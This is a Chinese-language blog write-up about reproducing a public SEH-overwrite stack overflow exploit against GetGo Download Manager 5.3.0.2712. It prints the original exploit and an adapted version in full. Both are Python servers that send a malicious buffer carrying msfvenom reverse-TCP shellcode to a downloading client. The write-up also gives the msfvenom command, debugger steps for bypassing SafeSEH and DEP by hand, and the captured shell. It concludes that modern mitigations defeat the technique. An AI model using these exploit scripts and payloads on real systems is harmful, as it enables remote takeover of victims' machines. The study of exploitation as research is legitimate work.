# 一次失败的栈溢出(SEH)之GetGo Download Manager

寻找栈溢出SEH样本的过程中，在exp-db上看到了这个洞。详情请参考<待补充>。

尽管没有CVE（提交者在XP SP3测试可还行），但是提交的exp很细致，是我喜欢的画风，同时也一并提供了漏洞软件。

GetGo Download Manager是一个下载工具，类似迅雷这种（当然不清楚服务端处理是否一个套路）。根据exp-db的信息来看，download具体URL资源时存在着一个栈溢出漏洞，提交者使用了覆盖SEH的方法进行了漏洞的利用。

## 侦查

先来看看提交者的exp：

```python
#!/usr/bin/python
 
#
# Exploit Author: bzyo
# Twitter: @bzyo_
# Exploit Title: GetGo Download Manager 5.3.0.2712 - Remote Buffer Overflow (SEH)
# Date: 02-24-2018
# Vulnerable Software: GetGo Download Manager 5.3.0.2712
# Vendor Homepage: http://www.getgosoft.com/
# Version: 5.3.0.2712
# Software Link: https://www.exploit-db.com/apps/b26d82eadef93531f8beafac6105ef13-GetGoDMSetup.exe
# Tested On: Windows XP SP3
#
#
# PoC: 
# 1. setup listener 443 on attacking machine
# 2. run script on attacking machine
# 3. open app on victim machine
# 4. go to download
# 5. select new, add http://attackerip to URL, index.html to File Name, and select OK
# 6. check listener, remote shell
#
 
import sys
import socket
import os
import time
 
host = "192.168.0.149"
port = 80
  
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
s.listen(1)
print "\n[+] listening on %d ..." % port
 
bz, addr = s.accept()
print "[+] connection accepted from %s" % addr[0]
 
junk = "A"*20
 
#jump 6 
nseh = "\xeb\x06\x90\x90"
 
#0x72d11f39 : pop edi # pop esi # ret 0x04 |  {PAGE_EXECUTE_READ} [msacm32.drv]
seh = "\x39\x1f\xd1\x72"
 
#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.149 LPORT=443 -b "\x00" -f c
#Payload size: 351 bytes
reverse = (
"\xba\x8f\xf6\x0e\x24\xd9\xf7\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
"\x52\x31\x50\x12\x83\xc0\x04\x03\xdf\xf8\xec\xd1\x23\xec\x73"
"\x19\xdb\xed\x13\x93\x3e\xdc\x13\xc7\x4b\x4f\xa4\x83\x19\x7c"
"\x4f\xc1\x89\xf7\x3d\xce\xbe\xb0\x88\x28\xf1\x41\xa0\x09\x90"
"\xc1\xbb\x5d\x72\xfb\x73\x90\x73\x3c\x69\x59\x21\x95\xe5\xcc"
"\xd5\x92\xb0\xcc\x5e\xe8\x55\x55\x83\xb9\x54\x74\x12\xb1\x0e"
"\x56\x95\x16\x3b\xdf\x8d\x7b\x06\xa9\x26\x4f\xfc\x28\xee\x81"
"\xfd\x87\xcf\x2d\x0c\xd9\x08\x89\xef\xac\x60\xe9\x92\xb6\xb7"
"\x93\x48\x32\x23\x33\x1a\xe4\x8f\xc5\xcf\x73\x44\xc9\xa4\xf0"
"\x02\xce\x3b\xd4\x39\xea\xb0\xdb\xed\x7a\x82\xff\x29\x26\x50"
"\x61\x68\x82\x37\x9e\x6a\x6d\xe7\x3a\xe1\x80\xfc\x36\xa8\xcc"
"\x31\x7b\x52\x0d\x5e\x0c\x21\x3f\xc1\xa6\xad\x73\x8a\x60\x2a"
"\x73\xa1\xd5\xa4\x8a\x4a\x26\xed\x48\x1e\x76\x85\x79\x1f\x1d"
"\x55\x85\xca\xb2\x05\x29\xa5\x72\xf5\x89\x15\x1b\x1f\x06\x49"
"\x3b\x20\xcc\xe2\xd6\xdb\x87\xcc\x8f\xe3\xc2\xa5\xcd\xe3\xed"
"\x8e\x5b\x05\x87\xe0\x0d\x9e\x30\x98\x17\x54\xa0\x65\x82\x11"
"\xe2\xee\x21\xe6\xad\x06\x4f\xf4\x5a\xe7\x1a\xa6\xcd\xf8\xb0"
"\xce\x92\x6b\x5f\x0e\xdc\x97\xc8\x59\x89\x66\x01\x0f\x27\xd0"
"\xbb\x2d\xba\x84\x84\xf5\x61\x75\x0a\xf4\xe4\xc1\x28\xe6\x30"
"\xc9\x74\x52\xed\x9c\x22\x0c\x4b\x77\x85\xe6\x05\x24\x4f\x6e"
"\xd3\x06\x50\xe8\xdc\x42\x26\x14\x6c\x3b\x7f\x2b\x41\xab\x77"
"\x54\xbf\x4b\x77\x8f\x7b\x7b\x32\x8d\x2a\x14\x9b\x44\x6f\x79"
"\x1c\xb3\xac\x84\x9f\x31\x4d\x73\xbf\x30\x48\x3f\x07\xa9\x20"
"\x50\xe2\xcd\x97\x51\x27")
 
fill = "D"*(4055 - len(reverse))
 
payload = junk + nseh + seh + reverse + fill
 
buffer = payload + "\r"
buffer+= payload + "\r"
buffer+= payload + "\r\n"
 
print bz.recv(1000)
bz.send(buffer)
print "[+] sending buffer ok\n"
 
time.sleep(3)
bz.close()
s.close()
```

根据payload的布局，可以肯定这是个相当经典的SEH覆盖利用。按照这种布局，在触发异常时，程序会走到seh handler的地址，这里是个pop | pop | ret（根据注释），而因为esp在程序走到seh handler时一定是指向[nseh-8]处，所以seh handler执行pop | pop | ret会返回到nseh处，而nseh是个短jmp，它会跳过6个字节（两字节nop + 4字节seh），跳转到reverse这段shellcode执行。这段shellcode会反弹tcp shell到192.168.0.149:443，注释中也给出了msfvenom的生成参数。

##调整exp

因为我本地环境和提交者有所差异，所以shellcode需要调整一下，pop|pop|ret的地址也要在victim环境中重新搜索（如果提交者给出的地址处在non-ASLR的模块上，应该直接可用）。

重新生成一段shellcode，修改一下IP地址，我的attacker addr是192.168.1.100，victim addr是192.168.1.101，attacker上用nc在8686端口listen：

```shell
root@kali:~# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=8686 -b "\x00" -f python
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
Found 10 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
buf =  ""
buf += "\xd9\xcf\xd9\x74\x24\xf4\xba\xa3\xfc\xc8\xfe\x5e\x2b"
buf += "\xc9\xb1\x52\x83\xc6\x04\x31\x56\x13\x03\xf5\xef\x2a"
buf += "\x0b\x05\xe7\x29\xf4\xf5\xf8\x4d\x7c\x10\xc9\x4d\x1a"
buf += "\x51\x7a\x7e\x68\x37\x77\xf5\x3c\xa3\x0c\x7b\xe9\xc4"
buf += "\xa5\x36\xcf\xeb\x36\x6a\x33\x6a\xb5\x71\x60\x4c\x84"
buf += "\xb9\x75\x8d\xc1\xa4\x74\xdf\x9a\xa3\x2b\xcf\xaf\xfe"
buf += "\xf7\x64\xe3\xef\x7f\x99\xb4\x0e\x51\x0c\xce\x48\x71"
buf += "\xaf\x03\xe1\x38\xb7\x40\xcc\xf3\x4c\xb2\xba\x05\x84"
buf += "\x8a\x43\xa9\xe9\x22\xb6\xb3\x2e\x84\x29\xc6\x46\xf6"
buf += "\xd4\xd1\x9d\x84\x02\x57\x05\x2e\xc0\xcf\xe1\xce\x05"
buf += "\x89\x62\xdc\xe2\xdd\x2c\xc1\xf5\x32\x47\xfd\x7e\xb5"
buf += "\x87\x77\xc4\x92\x03\xd3\x9e\xbb\x12\xb9\x71\xc3\x44"
buf += "\x62\x2d\x61\x0f\x8f\x3a\x18\x52\xd8\x8f\x11\x6c\x18"
buf += "\x98\x22\x1f\x2a\x07\x99\xb7\x06\xc0\x07\x40\x68\xfb"
buf += "\xf0\xde\x97\x04\x01\xf7\x53\x50\x51\x6f\x75\xd9\x3a"
buf += "\x6f\x7a\x0c\xec\x3f\xd4\xff\x4d\xef\x94\xaf\x25\xe5"
buf += "\x1a\x8f\x56\x06\xf1\xb8\xfd\xfd\x92\x06\xa9\xfc\x06"
buf += "\xef\xa8\xfe\xe7\x01\x25\x18\x8d\xcd\x60\xb3\x3a\x77"
buf += "\x29\x4f\xda\x78\xe7\x2a\xdc\xf3\x04\xcb\x93\xf3\x61"
buf += "\xdf\x44\xf4\x3f\xbd\xc3\x0b\xea\xa9\x88\x9e\x71\x29"
buf += "\xc6\x82\x2d\x7e\x8f\x75\x24\xea\x3d\x2f\x9e\x08\xbc"
buf += "\xa9\xd9\x88\x1b\x0a\xe7\x11\xe9\x36\xc3\x01\x37\xb6"
buf += "\x4f\x75\xe7\xe1\x19\x23\x41\x58\xe8\x9d\x1b\x37\xa2"
buf += "\x49\xdd\x7b\x75\x0f\xe2\x51\x03\xef\x53\x0c\x52\x10"
buf += "\x5b\xd8\x52\x69\x81\x78\x9c\xa0\x01\x88\xd7\xe8\x20"
buf += "\x01\xbe\x79\x71\x4c\x41\x54\xb6\x69\xc2\x5c\x47\x8e"
buf += "\xda\x15\x42\xca\x5c\xc6\x3e\x43\x09\xe8\xed\x64\x18"
```

## 调试exp

victim上nc在8686端口等待：

```
D:\Documents and Settings\Desktop>nc -lvv -p 8686
listening on [any] 8686 ...
```

在victim上安装GetGo并运行，使用Immunity Debugger附加：

![](/images/180703_1.png)

![](/images/180703_2.png)

先看看地址0x72d11f39这个pop|pop|ret是否正确，看了一下地址空间，发现根本不存在。。。

只能自力更生重新找一个pop|pop|ret。为了保证指令的稳定性以及可用性，我们尽量在non-ASLR && noSafeSEH的模块上查找。

使用mona插件探测一下noaslr:

![](/images/180703_3.png)

看到这儿就基本凉凉了，有两个模块尽管没有ASLR，却都开启了SafeSEH。SafeSEH是一定要不得的，所以只好退而求其次，ASLR就ASLR吧，至少本地能过:( 

![](/images/180703_4.png)

彻底凉了，现在我明白为什么提交者在XP sp3上测试了。。。

不过既然走到这儿了，我们就继续验证一下问题是否存在吧，忽略SafeSEH，先在GetGo.exe空间和Resource_En.dll空间中找一个pop|pop|ret。

![](/images/180703_5.png)

忽然发现GetGo空间的地址存在bad byte——"\x00"，根据提交者在msfvenom的-b参数可知这可能会引起截断，而Resource_En.dll中找了一圈却一个都没有。

算了，ASLR也不要求了，直接kernel32.dll吧，至少本次系统关机前都是稳定的。。。

![](/images/180703_6.png)

改写的exp:

```python
#!/usr/bin/python
 
#
# Exploit Author: bzyo
# Twitter: @bzyo_
# Exploit Title: GetGo Download Manager 5.3.0.2712 - Remote Buffer Overflow (SEH)
# Date: 02-24-2018
# Vulnerable Software: GetGo Download Manager 5.3.0.2712
# Vendor Homepage: http://www.getgosoft.com/
# Version: 5.3.0.2712
# Software Link: https://www.exploit-db.com/apps/b26d82eadef93531f8beafac6105ef13-GetGoDMSetup.exe
# Tested On: Windows XP SP3
#
#
# PoC: 
# 1. setup listener 443 on attacking machine
# 2. run script on attacking machine
# 3. open app on victim machine
# 4. go to download
# 5. select new, add http://attackerip to URL, index.html to File Name, and select OK
# 6. check listener, remote shell
#
 
import sys
import socket
import os
import time
 
host = "0.0.0.0"
port = 80
  
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
s.listen(1)
print "\n[+] listening on %d ..." % port
 
bz, addr = s.accept()
print "[+] connection accepted from %s" % addr[0]
 
junk = "A"*20
 
#jump 6 
nseh = "\xeb\x06\x90\x90"
 
seh = "\x99\x89\xc5\x76"	# 这里和图中的不一致是因为我重启了虚拟机。。。
 
#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=8686 -b "\x00" -f c
#Payload size: 351 bytes
buf =  ""
buf += "\xd9\xcf\xd9\x74\x24\xf4\xba\xa3\xfc\xc8\xfe\x5e\x2b"
buf += "\xc9\xb1\x52\x83\xc6\x04\x31\x56\x13\x03\xf5\xef\x2a"
buf += "\x0b\x05\xe7\x29\xf4\xf5\xf8\x4d\x7c\x10\xc9\x4d\x1a"
buf += "\x51\x7a\x7e\x68\x37\x77\xf5\x3c\xa3\x0c\x7b\xe9\xc4"
buf += "\xa5\x36\xcf\xeb\x36\x6a\x33\x6a\xb5\x71\x60\x4c\x84"
buf += "\xb9\x75\x8d\xc1\xa4\x74\xdf\x9a\xa3\x2b\xcf\xaf\xfe"
buf += "\xf7\x64\xe3\xef\x7f\x99\xb4\x0e\x51\x0c\xce\x48\x71"
buf += "\xaf\x03\xe1\x38\xb7\x40\xcc\xf3\x4c\xb2\xba\x05\x84"
buf += "\x8a\x43\xa9\xe9\x22\xb6\xb3\x2e\x84\x29\xc6\x46\xf6"
buf += "\xd4\xd1\x9d\x84\x02\x57\x05\x2e\xc0\xcf\xe1\xce\x05"
buf += "\x89\x62\xdc\xe2\xdd\x2c\xc1\xf5\x32\x47\xfd\x7e\xb5"
buf += "\x87\x77\xc4\x92\x03\xd3\x9e\xbb\x12\xb9\x71\xc3\x44"
buf += "\x62\x2d\x61\x0f\x8f\x3a\x18\x52\xd8\x8f\x11\x6c\x18"
buf += "\x98\x22\x1f\x2a\x07\x99\xb7\x06\xc0\x07\x40\x68\xfb"
buf += "\xf0\xde\x97\x04\x01\xf7\x53\x50\x51\x6f\x75\xd9\x3a"
buf += "\x6f\x7a\x0c\xec\x3f\xd4\xff\x4d\xef\x94\xaf\x25\xe5"
buf += "\x1a\x8f\x56\x06\xf1\xb8\xfd\xfd\x92\x06\xa9\xfc\x06"
buf += "\xef\xa8\xfe\xe7\x01\x25\x18\x8d\xcd\x60\xb3\x3a\x77"
buf += "\x29\x4f\xda\x78\xe7\x2a\xdc\xf3\x04\xcb\x93\xf3\x61"
buf += "\xdf\x44\xf4\x3f\xbd\xc3\x0b\xea\xa9\x88\x9e\x71\x29"
buf += "\xc6\x82\x2d\x7e\x8f\x75\x24\xea\x3d\x2f\x9e\x08\xbc"
buf += "\xa9\xd9\x88\x1b\x0a\xe7\x11\xe9\x36\xc3\x01\x37\xb6"
buf += "\x4f\x75\xe7\xe1\x19\x23\x41\x58\xe8\x9d\x1b\x37\xa2"
buf += "\x49\xdd\x7b\x75\x0f\xe2\x51\x03\xef\x53\x0c\x52\x10"
buf += "\x5b\xd8\x52\x69\x81\x78\x9c\xa0\x01\x88\xd7\xe8\x20"
buf += "\x01\xbe\x79\x71\x4c\x41\x54\xb6\x69\xc2\x5c\x47\x8e"
buf += "\xda\x15\x42\xca\x5c\xc6\x3e\x43\x09\xe8\xed\x64\x18"

reverse = buf
fill = "D"*(4055 - len(reverse))
 
payload = junk + nseh + seh + reverse + fill
 
buffer = payload + "\r"
buffer+= payload + "\r"
buffer+= payload + "\r\n"
 
print bz.recv(1000)
bz.send(buffer)
print "[+] sending buffer ok\n"
 
time.sleep(3)
bz.close()
s.close()
```

运行起来后，会在tcp 80端口监听。此后在victim GetGo点击下载，url填充http://192.168.1.100/

此时，我们的attack exp.py程序有了反应:

```
[+] listening on 80 ...
[+] connection accepted from 192.168.1.101
GET / HTTP/1.1

Host: 192.168.1.100

Accept: */*

Range: bytes=0-

User-Agent: GetGo Download Manager 5.0 (www.getgosoft.com)Pragma: no-cache

Cache-Control: no-cache

Connection: Keep-Alive




[+] sending buffer ok
```

而victim虚拟机中程序抛异常:

![](/images/180703_7.png)

此时的SEH链:

![](/images/180703_8.png)

很好，看起来我们成功覆盖了第二个SEH块，但因为SafeSEH的关系，当第一个SEH返回表示继续Continue时，程序会先检查第二个SEH块的正确性，所以我们先在第一个SEH handler的地址下断点，执行过去：

![](/images/180703_9.png)

一路跟随到这里：

![](/images/180703_10.png)

由于我本地离线没有符号表，所以ntdll的函数名称没有被解析出来，实际上CALL ntdll.7716F76B就是对SEH Handler的检查（因为SafeSEH的缘故，会有这里的查表检查），我把返回结果AL改为1（非法时AL是0），让下面的JE不跳转。

此后，就会跳到jmp eip+6处：

![](/images/180703_11.png)

由于我调试了多次和ASLR的关系，每次地址都不太一样，但不影响正确性。

此后，又遇到了一个问题，当继续执行时发现又抛异常了，指令无法执行，这其实是因为DEP的关系。

![](/images/180703_12.png)

这就非常难受了，只好手动为stack增加可执行权限：

![](/images/180703_13.png)

此后继续运行，我们栈空间上的shellcode成功运行。在attacker机器上会看到shell成功反弹：

![](/images/180703_14.png)

## 总结

提交者是在XP SP3上进行测试的，但我印象中XP SP3也是有DEP、ASLR等保护的，所以对于他的测试环境我表示质疑。另一方面也可以看到尽管程序存在着经典的栈溢出漏洞，但SEH覆盖的手法在面对3大mitigation（ASLR、DEP和SafeSEH ）开启的状况下可谓是举步维艰，如果不是一步一步在调试器中强行修改指令结果和内存Stack权限，我们的SEH覆盖手法无疑是失败的。

对于ASLR、DEP和SafeSEH要如何正大光明的绕过，而不是在调试器中掩耳盗铃呢？实际上他们都取决于具体的环境，同时也往往依赖其他的漏洞来配合，在mitigation大行其道的现代漏洞利用环境中，以单一的高质量漏洞一剑封喉的情况越来越少，往往都是多个漏洞组合在一起，形成一整条攻击链。

当然，这些也就是后话了，本文的宗旨仅仅在于通过漏洞实例演示SEH覆盖方法的可行性，并真刀实枪的阐释在现代mitigation重重保护的环境下传统方法无用武之地的窘境。